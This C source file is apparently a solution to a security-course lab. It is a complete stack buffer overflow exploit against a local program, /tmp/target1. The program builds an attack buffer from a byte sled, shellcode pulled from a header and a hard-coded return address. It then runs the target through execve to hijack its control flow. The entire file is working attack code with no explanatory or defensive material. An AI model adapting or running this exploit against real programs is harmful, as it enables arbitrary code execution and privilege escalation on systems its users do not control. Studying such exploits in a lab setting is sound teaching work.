#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target1"

int main(void)
{
  char *args[3];
  char *env[1];

  char attack_buffer[137];

  memset(attack_buffer, 0x91, 136);  // Fill with NOPs
  memcpy(attack_buffer, shellcode, strlen(shellcode));  // Copy the payload in

  attack_buffer[136] = 0; // null terminate

  *(unsigned int*)(attack_buffer + 132) = 0xbfffff66; // point to beginning of buffer

  args[0] = TARGET; args[1] = attack_buffer; args[2] = NULL;
  env[0] = NULL;

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
